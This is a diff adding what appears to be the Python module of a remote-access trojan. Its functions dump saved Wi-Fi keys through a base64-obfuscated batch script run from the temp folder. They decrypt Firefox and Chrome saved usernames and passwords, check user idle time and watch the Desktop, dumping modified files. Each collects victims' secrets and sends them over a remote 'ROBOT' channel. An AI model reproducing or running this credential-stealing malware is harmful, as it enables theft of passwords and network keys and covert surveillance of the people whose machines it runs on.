@@ -1,0 +1,562 @@
+def wifi_dump():
+
+	batch_command = "c2V0bG9jYWwgZW5hYmxlZGVsYXllZGV4cGFuc2lvbg0KDQoNCiAgICA6OiBHZXQgYWxsIHRoZSBw" + \
+					"cm9maWxlcw0KICAgIGNhbGwgOmdldC1wcm9maWxlcyByDQoNCiAgICA6OiBGb3IgZWFjaCBwcm9m" + \
+					"aWxlLCB0cnkgdG8gZ2V0IHRoZSBwYXNzd29yZA0KICAgIDptYWluLW5leHQtcHJvZmlsZQ0KICAg" + \
+					"ICAgICBmb3IgL2YgInRva2Vucz0xKiBkZWxpbXM9LCIgJSVhIGluICgiJXIlIikgZG8gKA0KICAg" + \
+					"ICAgICAgICAgY2FsbCA6Z2V0LXByb2ZpbGUta2V5ICIlJWEiIGtleQ0KICAgICAgICAgICAgaWYg" + \
+					"IiFrZXkhIiBORVEgIiIgKA0KICAgICAgICAgICAgICAgIGVjaG8gICAlJWEgOiAha2V5ISA+PiAl" + \
+					"VEVNUCVcd2lmaV9saXN0LnR4dA0KICAgICAgICAgICAgKQ0KICAgICAgICAgICAgc2V0IHI9JSVi" + \
+					"DQogICAgICAgICkNCiAgICAgICAgaWYgIiVyJSIgTkVRICIiIGdvdG8gbWFpbi1uZXh0LXByb2Zp" + \
+					"bGUNCg0KICAgIGVjaG8uDQoNCg0KICAgIGdvdG8gOmVvZg0KDQo6Og0KOjogR2V0IHRoZSBXaUZp" + \
+					"IGtleSBvZiBhIGdpdmVuIHByb2ZpbGUNCjpnZXQtcHJvZmlsZS1rZXkgPDE9cHJvZmlsZS1uYW1l" + \
+					"PiA8Mj1vdXQtcHJvZmlsZS1rZXk+DQogICAgc2V0bG9jYWwNCg0KICAgIHNldCByZXN1bHQ9DQoN" + \
+					"CiAgICBGT1IgL0YgInVzZWJhY2txIHRva2Vucz0yIGRlbGltcz06IiAlJWEgaW4gKA0KICAgICAg" + \
+					"ICBgbmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZV49IiV+MSIga2V5Xj1jbGVhciBefCBmaW5k" + \
+					"c3RyIC9DOiJLZXkgQ29udGVudCJgKSBETyAoDQogICAgICAgIHNldCByZXN1bHQ9JSVhDQogICAg" + \
+					"ICAgIHNldCByZXN1bHQ9IXJlc3VsdDp+MSENCiAgICApDQogICAgKA0KICAgICAgICBlbmRsb2Nh" + \
+					"bA0KICAgICAgICBzZXQgJTI9JXJlc3VsdCUNCiAgICApDQoNCiAgICBnb3RvIDplb2YNCg0KOjoN" + \
+					"Cjo6IEdldCBhbGwgbmV0d29yayBwcm9maWxlcyAoY29tbWEgc2VwYXJhdGVkKSBpbnRvIHRoZSBy" + \
+					"ZXN1bHQgcmVzdWx0LXZhcmlhYmxlDQo6Z2V0LXByb2ZpbGVzIDwxPXJlc3VsdC12YXJpYWJsZT4N" + \
+					"CiAgICBzZXRsb2NhbA0KDQogICAgc2V0IHJlc3VsdD0NCg0KDQogICAgRk9SIC9GICJ1c2ViYWNr" + \
+					"cSB0b2tlbnM9MiBkZWxpbXM9OiIgJSVhIGluICgNCiAgICAgICAgYG5ldHNoIHdsYW4gc2hvdyBw" + \
+					"cm9maWxlcyBefCBmaW5kc3RyIC9DOiJBbGwgVXNlciBQcm9maWxlImApIERPICgNCiAgICAgICAg" + \
+					"c2V0IHZhbD0lJWENCiAgICAgICAgc2V0IHZhbD0hdmFsOn4xIQ0KDQogICAgICAgIHNldCByZXN1" + \
+					"bHQ9JSF2YWwhLCFyZXN1bHQhDQogICAgKQ0KICAgICgNCiAgICAgICAgZW5kbG9jYWwNCiAgICAg" + \
+					"ICAgc2V0ICUxPSVyZXN1bHQ6fjAsLTElDQogICAgKQ0KDQogICAgZ290byA6ZW9mDQo="
+
+	batch_code = batch_command.decode('base64')
+
+	batch_file_name = "\wifi.bat"
+	path_to_batch_file = os.environ["TEMP"] + batch_file_name
+
+	with open(path_to_batch_file, 'w') as batch_file:
+		batch_file.write(batch_code)
+	batch_file.close()
+
+	os.system(path_to_batch_file)
+	sleep(1)
+	os.remove(path_to_batch_file)
+
+	path_to_all_wifi_list = os.environ["TEMP"] + "\wifi_list.txt"
+
+	if os.path.isfile(path_to_all_wifi_list):
+
+		with open(path_to_all_wifi_list, 'r') as local_file:
+
+			content = local_file.read().strip()
+			for line in content.split("\n"):
+				ROBOT.send(pencode(line))
+				sleep(0.1)
+
+			ROBOT.send(pencode("#DATA_HANDLER"))
+
+		local_file.close()
+
+	else:
+		ROBOT.send(pencode("No wifi(es) found.\n"))
+
+	if os.path.isfile(path_to_all_wifi_list): os.remove(path_to_all_wifi_list)
+
+
+
+
+DEVNULL = open(os.devnull, 'w')
+
+
+class NotFoundError(Exception):
+	pass
+
+
+class Exit(Exception):
+
+	ERROR = 1
+	MISSING_PROFILEINI = 2
+	MISSING_SECRETS = 3
+	BAD_PROFILEINI = 4
+	LOCATION_NO_DIRECTORY = 5
+
+	FAIL_LOAD_NSS = 11
+	FAIL_INIT_NSS = 12
+	FAIL_NSS_KEYSLOT = 13
+	FAIL_SHUTDOWN_NSS = 14
+	BAD_MASTER_PASSWORD = 15
+	NEED_MASTER_PASSWORD = 16
+
+	PASSSTORE_NOT_INIT = 20
+	PASSSTORE_MISSING = 21
+	PASSSTORE_ERROR = 22
+
+	READ_GOT_EOF = 30
+	MISSING_CHOICE = 31
+	NO_SUCH_PROFILE = 32
+
+	UNKNOWN_ERROR = 100
+	KEYBOARD_INTERRUPT = 102
+
+	def __init__(self, exitcode):
+		self.exitcode = exitcode
+
+	def __unicode__(self):
+		return "Premature program exit with exit code {0}".format(self.exitcode)
+
+
+class Credentials(object):
+
+	def __init__(self, db):
+		self.db = db
+
+		if not os.path.isfile(db):
+			raise NotFoundError("ERROR - {0} database not found\n".format(db))
+
+	def __iter__(self):
+		pass
+
+	def done(self):
+		pass
+
+
+class SqliteCredentials(Credentials):
+
+	def __init__(self, profile):
+		db = os.path.join(profile, "signons.sqlite")
+
+		super(SqliteCredentials, self).__init__(db)
+
+		self.conn = sqlite3.connect(db)
+		self.c = self.conn.cursor()
+
+	def __iter__(self):
+
+		self.c.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
+		for i in self.c:
+			# yields hostname, encryptedUsername, encryptedPassword, encType
+			yield i
+
+	def done(self):
+		super(SqliteCredentials, self).done()
+
+		self.c.close()
+		self.conn.close()
+
+
+class JsonCredentials(Credentials):
+
+	def __init__(self, profile):
+		db = os.path.join(profile, "logins.json")
+
+		super(JsonCredentials, self).__init__(db)
+
+	def __iter__(self):
+		with open(self.db) as fh:
+
+			data = load(fh)
+
+			try:
+				logins = data["logins"]
+			except:
+				raise Exception("Unrecognized format in {0}".format(self.db))
+			if len(logins) == 0:
+				yield "No password(s) found."
+			for i in logins:
+				yield (i["hostname"], i["encryptedUsername"],
+					   i["encryptedPassword"], i["encType"])
+
+
+class NSSDecoder(object):
+
+	class SECItem(Structure):
+
+		_fields_ = [
+			('type', c_uint),
+			('data', c_char_p),  # actually: unsigned char *
+			('len', c_uint),
+		]
+
+	class PK11SlotInfo(Structure):
+		pass
+
+
+	def __init__(self):
+
+		self.NSS = None
+		self.load_libnss()
+
+		SlotInfoPtr = POINTER(self.PK11SlotInfo)
+		SECItemPtr = POINTER(self.SECItem)
+
+		self._set_ctypes(c_int, "NSS_Init", c_char_p)
+		self._set_ctypes(c_int, "NSS_Shutdown")
+		self._set_ctypes(SlotInfoPtr, "PK11_GetInternalKeySlot")
+		self._set_ctypes(None, "PK11_FreeSlot", SlotInfoPtr)
+		self._set_ctypes(c_int, "PK11_CheckUserPassword", SlotInfoPtr, c_char_p)
+		self._set_ctypes(c_int, "PK11SDR_Decrypt", SECItemPtr, SECItemPtr, c_void_p)
+		self._set_ctypes(None, "SECITEM_ZfreeItem", SECItemPtr, c_int)
+
+		self._set_ctypes(c_int, "PORT_GetError")
+		self._set_ctypes(c_char_p, "PR_ErrorToName", c_int)
+		self._set_ctypes(c_char_p, "PR_ErrorToString", c_int, c_uint32)
+
+
+	def _set_ctypes(self, restype, name, *argtypes):
+
+		res = getattr(self.NSS, name)
+		res.restype = restype
+		res.argtypes = argtypes
+		setattr(self, "_" + name, res)
+
+
+	@staticmethod
+	def find_nss(locations, nssname):
+
+		for loc in locations:
+			if os.path.exists(os.path.join(loc, nssname)):
+				return loc
+
+		return ""
+
+
+	def load_libnss(self):
+
+		nssname = "nss3.dll"
+		locations = (
+			"",  # Current directory or system lib finder
+			r"C:\Program Files (x86)\Mozilla Firefox",
+			r"C:\Program Files\Mozilla Firefox"
+		)
+		firefox = self.find_nss(locations, nssname)
+
+		os.environ["PATH"] = ';'.join([os.environ["PATH"], firefox])
+
+		try:
+			nsslib = os.path.join(firefox, nssname)
+
+			self.NSS = CDLL(nsslib)
+
+		except Exception as e:
+			raise Exit(Exit.FAIL_LOAD_NSS)
+
+
+	def handle_error(self):
+
+		code = self._PORT_GetError()
+		name = self._PR_ErrorToName(code)
+		name = "NULL" if name is None else name.decode("ascii")
+		# 0 is the default language (localization related)
+		text = self._PR_ErrorToString(code, 0)
+		text = text.decode("utf8")
+
+
+	def decode(self, data64):
+		data = data64.decode('base64')
+		inp = self.SECItem(0, data, len(data))
+		out = self.SECItem(0, None, 0)
+
+		e = self._PK11SDR_Decrypt(inp, out, None)
+
+		try:
+			if e == -1:
+
+				self.handle_error()
+				raise Exit(Exit.NEED_MASTER_PASSWORD)
+
+			res = string_at(out.data, out.len).decode("utf8")
+		finally:
+			# Avoid leaking SECItem
+			self._SECITEM_ZfreeItem(out, 0)
+
+		return res
+
+
+class NSSInteraction(object):
+
+	def __init__(self):
+
+		self.profile = None
+		self.NSS = NSSDecoder()
+
+
+	def load_profile(self, profile):
+
+		self.profile = profile
+		e = self.NSS._NSS_Init(self.profile.encode("utf8"))
+		if e != 0:
+			self.NSS.handle_error()
+
+
+	def authenticate(self, interactive):
+
+		keyslot = self.NSS._PK11_GetInternalKeySlot()
+		if not keyslot:
+			self.NSS.handle_error()
+
+
+	def unload_profile(self):
+
+		e = self.NSS._NSS_Shutdown()
+		if e != 0:
+			self.NSS.handle_error()
+
+
+	def decode_entry(self, user64, passw64):
+
+		user = self.NSS.decode(user64)
+		passw = self.NSS.decode(passw64)
+
+		return user, passw
+
+
+	def decrypt_passwords(self):
+
+		credentials = obtain_credentials(self.profile)
+
+		try:
+
+			for host, user, passw, enctype in credentials:
+
+				if enctype:
+					user, passw = self.decode_entry(user, passw)
+				output = (
+					u"\nWebsite : {0}\n".format(host),
+					u"Username: {0}\n".format(user),
+					u"Password: {0}\n".format(passw),
+				)
+				for line in output:
+					ROBOT.send(pencode(str(line))); sleep(.1)
+				ROBOT.send(pencode("#DATA_HANDLER"))
+
+		except ValueError:
+			ROBOT.send(pencode("No password(s) found."))
+
+		credentials.done()
+
+
+
+def obtain_credentials(profile):
+
+	try:
+		credentials = JsonCredentials(profile)
+	except NotFoundError:
+		try:
+			credentials = SqliteCredentials(profile)
+		except NotFoundError:
+			raise Exit(Exit.MISSING_SECRETS)
+
+	return credentials
+
+
+
+def mozilla_passwords():
+
+	interactive  = True
+	basepath     = os.path.join(os.environ['APPDATA'], "Mozilla", "Firefox")
+	profileini   = os.path.join(basepath, "profiles.ini")
+
+	nss = NSSInteraction()
+
+	profiles = ConfigParser()
+	profiles.read(profileini)
+
+	for section in profiles.sections():
+		if section.startswith("Profile"):
+			section = profiles.get(section, "Path")
+		else:
+			continue
+
+	profile = os.path.join(basepath, section)
+
+	nss.load_profile(profile)
+	nss.authenticate(interactive)
+	nss.decrypt_passwords()
+
+	nss.unload_profile()
+
+
+
+
+
+
+
+
+def chrome_passwords():
+
+	info_list = []
+
+	path = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+	if (os.path.isdir(path) == False):
+		ROBOT.send(pencode('Chrome doesn\'t exists'))
+
+	else:
+
+		try:
+
+			connection = sqlite3.connect(path + "Login Data")
+
+			with connection:
+				cursor = connection.cursor()
+				v = cursor.execute(
+					'SELECT action_url, username_value, password_value FROM logins')
+				value = v.fetchall()
+
+			for information in value:
+
+				password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+				if password:
+					info_list.append({
+						'origin_url': information[0],
+						'username': information[1],
+						'password': str(password)
+					})
+
+		except sqlite3.OperationalError, e:
+
+			e = str(e)
+
+			if (e == 'database is locked'):
+				return '[!] Make sure Google Chrome is not running in the background'
+
+			elif (e == 'no such table: logins'):
+				return '[!] Something wrong with the database name'
+
+			elif (e == 'unable to open database file'):
+				return '[!] Something wrong with the database path'
+
+			else:
+				return str(e)
+
+		for line in info_list:
+			ROBOT.send(pencode(str(line))); sleep(.1)
+		ROBOT.send(pencode("#DATA_HANDLER"))
+
+
+
+
+
+
+
+
+
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+keystrokes=0
+mouse_clicks = 0
+double_clicks = 0
+
+class LASTINPUTINFO(ctypes.Structure):
+    _fields_ = [("cbSize", ctypes.c_uint),
+                ("dwTime", ctypes.c_ulong)]
+
+
+
+
+def get_last_active():
+
+    struct_lastinputinfo = LASTINPUTINFO()
+    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
+
+    # get last input registered
+    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))
+
+    # now determine how long the machine has been running
+    run_time = kernel32.GetTickCount()
+
+    elapsed = run_time - struct_lastinputinfo.dwTime
+
+    ROBOT.send(pencode("[*] It's been %d milliseconds since the last input event.\n" % elapsed))
+
+
+
+
+
+# these are the common temp file directories
+desktop  = os.path.join(os.environ["HOMEPATH"], "Desktop")
+temp_dir = gettempdir()
+dirs_to_monitor = [desktop]
+
+# list of changes to send each request
+all_changes = []
+
+# file modification constants
+FILE_CREATED=1
+FILE_DELETED=2
+FILE_MODIFIED = 3
+FILE_RENAMED_FROM = 4
+FILE_RENAMED_TO = 5
+
+
+
+def start_monitor(path_to_watch):
+
+    # we create a thread for each monitoring run
+    FILE_LIST_DIRECTORY = 0x0001
+
+    try:
+		h_directory = win32file.CreateFile(
+	        path_to_watch,
+	        FILE_LIST_DIRECTORY,
+	        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
+	        None,
+	        win32con.OPEN_EXISTING,
+	        win32con.FILE_FLAG_BACKUP_SEMANTICS,
+	        None
+	    )
+
+		while 1:
+			try:
+				results = win32file.ReadDirectoryChangesW(
+					h_directory,
+					1024,
+					True,
+					win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
+					win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
+					win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
+					win32con.FILE_NOTIFY_CHANGE_SIZE |
+					win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
+					win32con.FILE_NOTIFY_CHANGE_SECURITY,
+					None,
+					None
+	            )
+
+				for action, file_name in results:
+					full_filename = os.path.join(path_to_watch, file_name)
+					if action == FILE_CREATED:
+						all_changes.append("[ + ] Created %s\n" % full_filename)
+
+					elif action == FILE_DELETED:
+						all_changes.append("[ - ] Deleted %s\n" % full_filename)
+
+					elif action == FILE_MODIFIED:
+
+						all_changes.append("[ * ] Modified %s\n" % full_filename)
+
+						# dump out the file contents
+						all_changes.append("[vvv] Dumping contents...\n")
+
+						try:
+							fd = open(full_filename,"rb")
+							contents = fd.read()
+							if len(contents) < 2048:
+								pass
+							else:
+								contents = "(too big content)\n"
+							fd.close()
+							all_changes.append(contents)
+							all_changes.append("[^^^] Dump complete.\n")
+
+						except Exception as e:
+							all_changes.append("[!!!] %s.\n" % str(e))
+
+					elif action == FILE_RENAMED_FROM:
+						all_changes.append("[ > ] Renamed from: %s\n" % full_filename)
+
+					elif action == FILE_RENAMED_TO:
+						all_changes.append("[ < ] Renamed to: %s\n" % full_filename)
+
+					else:
+						all_changes.append("[???] Unknown: %s\n" % full_filename)
+
+			except:
+				pass
+    except Exception:
+        pass
